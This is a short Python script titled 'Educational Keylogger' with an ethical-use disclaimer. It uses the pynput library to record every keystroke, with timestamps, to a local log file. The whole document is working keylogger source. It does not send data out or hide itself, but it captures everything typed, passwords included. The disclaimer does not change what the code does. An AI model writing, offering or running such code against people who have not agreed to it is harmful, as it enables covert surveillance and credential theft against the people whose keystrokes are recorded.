# Educational Keylogger - FOR ETHICAL USE ONLY
# Author: [Your Name]
# Disclaimer: Unauthorized use is illegal. Use only with explicit permission.

from pynput.keyboard import Listener
import datetime

log_file = "key_strokes.log"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} - Key pressed: {key}\n")
    except Exception as e:
        print(f"Error logging keystroke: {e}")

with Listener(on_press=on_press) as listener:
    print("Keylogger started. Press Ctrl+C to stop.")
    listener.join()